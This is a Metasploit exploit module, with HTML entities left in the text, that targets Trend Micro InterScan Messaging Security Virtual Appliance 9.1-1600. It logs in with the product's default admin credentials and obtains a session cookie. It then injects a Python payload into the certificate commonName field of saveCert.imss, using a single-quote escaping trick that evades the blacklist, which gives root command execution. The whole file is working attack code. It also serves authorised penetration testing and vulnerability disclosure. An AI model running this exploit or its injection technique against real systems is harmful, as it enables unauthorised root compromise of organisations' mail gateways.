# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability in the Trend Micro
        IMSVA product. An authenticated user can execute a terminal command under
        the context of the web server user which is root. Besides, default installation
        of IMSVA comes with a default administrator credentials.

        saveCert.imss endpoint takes several user inputs and performs blacklisting.
        without proper sanitation. However,due to improper blacklisting rule it&#039;s possible to inject
        arbitrary commands into it. InterScan Messaging Security prior to 9.1.-1600 affected by this issue.

        This module was tested against IMSVA 9.1-1600.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # discovery & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/advisory-trend-micro-interscan-messaging-security-virtual-appliance-remote-code-execution/&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => "\x2f\x22"
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true,
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039; => &#039;Jan 15 2017&#039;,
      &#039;DefaultTarget&#039;  => 0
       ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The target URI of the Trend Micro IMSVA&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username for authentication&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for authentication&#039;, &#039;imsva&#039; ]),
        Opt::RPORT(8445)
      ]
    )
  end

  def login

    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]

    print_status("Attempting to login with #{user}:#{pass}")

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;login.imss&#039;),
      &#039;vars_post&#039; => {
        &#039;userid&#039; => user,
        &#039;pwdfake&#039; => Rex::Text::encode_base64(pass)
      }
    })

    if res && res.body.include?("The user name or password you entered is invalid")
      fail_with(Failure::NoAccess, "#{peer} - Login with #{user}:#{pass} failed...")
    end

    cookie = res.get_cookies
    if res.code == 302 && cookie.include?("JSESSIONID")
      jsessionid = cookie.scan(/JSESSIONID=(\w+);/).flatten.first
      print_good("Authenticated as #{user}:#{pass}")
      return jsessionid
    end

    nil
  end

  def exploit

    jsessionid = login

    unless jsessionid
      fail_with(Failure::Unknown, &#039;Unable to obtain the cookie session ID&#039;)
    end

    # Somehow java stores last visited url on session like viewstate!
    # Visit form before submitting it. Otherwise, it will cause a crash.

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;initCert.imss&#039;),
      &#039;cookie&#039; => "JSESSIONID=#{jsessionid}"
    })

    if !res or !res.body.include?("Transport Layer Security")
      fail_with(Failure::Unknown, &#039;Unable to visit initCert.imss&#039;)
    end

    # Random string that will be used as a cert name, state, email etc.
    r = Rex::Text::rand_text_alphanumeric(5)

    print_status("Delivering payload...")

    # Since double quote are blacklisted, we are using Single, Backslash, Single, Single on our payload. Thanks to @wvu !!!
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;saveCert.imss&#039;),
      &#039;cookie&#039; => "JSESSIONID=#{jsessionid}",
      &#039;vars_get&#039; => {
          &#039;mode&#039; => 0
      },
      &#039;vars_post&#039; => {
        &#039;certName&#039; => r,
        &#039;certType&#039; => 0,
        &#039;keyLength&#039; => 2048,
        &#039;countryCode&#039; => &#039;TR&#039;,
        &#039;state&#039; => r,
        &#039;locality&#039; => r,
        &#039;org&#039; => r,
        &#039;orgUnit&#039; => r,
        &#039;commonName&#039; => "#{r}&#039;;python -c &#039;#{payload.encoded.gsub("&#039;", "&#039;\\\\&#039;&#039;")}&#039; #",
        &#039;emailAddress&#039; => "#{r}@mail.com",
        &#039;validDays&#039; => &#039;&#039;,
        &#039;id&#039; => &#039;&#039;,
      }
    })
  end

end

